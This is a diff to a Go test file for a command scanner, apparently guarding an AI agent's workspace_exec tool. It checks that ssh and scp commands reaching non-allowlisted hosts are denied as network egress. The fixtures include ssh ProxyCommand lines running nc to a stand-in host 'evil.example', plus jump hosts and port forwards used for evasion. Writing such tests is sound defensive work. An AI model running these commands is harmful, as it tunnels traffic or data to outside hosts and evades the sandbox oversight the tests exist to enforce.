@@ -391,29 +391,110 @@ func TestSSHLikeHostsFindRemoteTargets(t *testing.T) {
 		[]string{"jump.evil", "allowed.example"},
 		schemelessNetworkHosts("scp -o ProxyJump=jump.evil ./x allowed.example:/tmp/x"),
 	)
+	require.Equal(t,
+		[]string{"evil.example", "allowed.example"},
+		schemelessNetworkHosts("ssh -o HostName=evil.example allowed.example"),
+	)
+	require.Equal(t,
+		[]string{"evil.example"},
+		schemelessNetworkHosts(`ssh -o "HostName evil.example" allowed.example`),
+	)
+	require.Equal(t,
+		[]string{"evil.example"},
+		schemelessNetworkHosts(`ssh -o "ProxyCommand nc evil.example 22" allowed.example`),
+	)
+	require.Equal(t, []string{"evil.example"}, hostsFromSSHConfigOption("HostName evil.example"))
+	require.Equal(t, []string{"evil.example"}, hostsFromSSHConfigOption("ProxyCommand nc evil.example 22"))
+	require.Equal(t,
+		[]string{"evil.example", "allowed.example"},
+		schemelessNetworkHosts("ssh -W evil.example:22 allowed.example"),
+	)
+	require.Equal(t,
+		[]string{"evil.example", "allowed.example"},
+		schemelessNetworkHosts("ssh -L 8080:evil.example:80 allowed.example"),
+	)
+	require.Equal(t,
+		[]string{"evil.example", "allowed.example"},
+		schemelessNetworkHosts("ssh -NL8080:evil.example:80 allowed.example"),
+	)
+	require.Equal(t,
+		[]string{"evil.example", "allowed.example"},
+		schemelessNetworkHosts("ssh -R 8080:evil.example:80 allowed.example"),
+	)
+	require.Equal(t,
+		[]string{"evil.example", "allowed.example"},
+		schemelessNetworkHosts("ssh -o LocalForward=8080:evil.example:80 allowed.example"),
+	)
+	require.Equal(t,
+		[]string{"evil.example", "allowed.example"},
+		schemelessNetworkHosts("ssh -o RemoteForward=8080:evil.example:80 allowed.example"),
+	)
 }
 
 func TestSSHLikeOptionHostsCheckedAgainstAllowlist(t *testing.T) {
 	p := DefaultPolicy()
+	p.AllowedCommands = append(p.AllowedCommands, "ssh", "scp")
+	p.DeniedCommands = []string{}
 	p.AllowedDomains = []string{"allowed.example"}
 	scanner := NewScanner(p)
 
-	tests := []string{
-		"ssh -J jump.evil allowed.example",
-		"scp -o ProxyJump=jump.evil ./x allowed.example:/tmp/x",
+	tests := []struct {
+		command  string
+		evidence string
+	}{
+		{command: "ssh -J jump.evil allowed.example", evidence: "jump.evil"},
+		{command: "scp -o ProxyJump=jump.evil ./x allowed.example:/tmp/x", evidence: "jump.evil"},
+		{command: "ssh -o HostName=evil.example allowed.example", evidence: "evil.example"},
+		{command: "ssh -oHostName=evil.example allowed.example", evidence: "evil.example"},
+		{command: `ssh -o "HostName evil.example" allowed.example`, evidence: "evil.example"},
+		{command: `ssh -o "ProxyCommand nc evil.example 22" allowed.example`, evidence: "evil.example"},
+		{command: "ssh -W evil.example:22 allowed.example", evidence: "evil.example"},
+		{command: "ssh -Wevil.example:22 allowed.example", evidence: "evil.example"},
+		{command: `ssh -o "HostName allowed.example" -W evil.example:22 allowed.example`, evidence: "evil.example"},
+		{command: "ssh -L 8080:evil.example:80 allowed.example", evidence: "evil.example"},
+		{command: "ssh -L8080:evil.example:80 allowed.example", evidence: "evil.example"},
+		{command: "ssh -NL8080:evil.example:80 allowed.example", evidence: "evil.example"},
+		{command: "ssh -R 8080:evil.example:80 allowed.example", evidence: "evil.example"},
+		{command: "ssh -o LocalForward=8080:evil.example:80 allowed.example", evidence: "evil.example"},
+		{command: "ssh -o RemoteForward=8080:evil.example:80 allowed.example", evidence: "evil.example"},
 	}
-	for _, command := range tests {
-		t.Run(command, func(t *testing.T) {
+	for _, tc := range tests {
+		t.Run(tc.command, func(t *testing.T) {
 			report := scanner.Scan(context.Background(), Request{
 				ToolName: "workspace_exec",
 				Backend:  BackendWorkspaceExec,
-				Command:  command,
+				Command:  tc.command,
 			})
 			require.Equal(t, DecisionDeny, report.Decision)
 			require.True(t, hasRule(report, ruleNetworkEgress), report.Findings)
-			require.True(t, hasFindingEvidence(report, ruleNetworkEgress, "jump.evil"), report.Findings)
+			require.True(t, hasFindingEvidence(report, ruleNetworkEgress, tc.evidence), report.Findings)
 		})
 	}
+
+	report := scanner.Scan(context.Background(), Request{
+		ToolName: "workspace_exec",
+		Backend:  BackendWorkspaceExec,
+		Args:     []string{"ssh", "-o", "HostName=evil.example", "allowed.example"},
+	})
+	require.Equal(t, DecisionDeny, report.Decision)
+	require.True(t, hasRule(report, ruleNetworkEgress), report.Findings)
+	require.True(t, hasFindingEvidence(report, ruleNetworkEgress, "evil.example"), report.Findings)
+
+	report = scanner.Scan(context.Background(), Request{
+		ToolName: "workspace_exec",
+		Backend:  BackendWorkspaceExec,
+		Command:  "ssh -L 8080:allowed.example:80 allowed.example",
+	})
+	require.Equal(t, DecisionAllow, report.Decision)
+	require.False(t, hasRule(report, ruleNetworkEgress), report.Findings)
+
+	report = scanner.Scan(context.Background(), Request{
+		ToolName: "workspace_exec",
+		Backend:  BackendWorkspaceExec,
+		Command:  "ssh -o LocalForward=8080:allowed.example:80 allowed.example",
+	})
+	require.Equal(t, DecisionAllow, report.Decision)
+	require.False(t, hasRule(report, ruleNetworkEgress), report.Findings)
 }
 
 func hasFindingEvidence(report Report, rule, evidence string) bool {
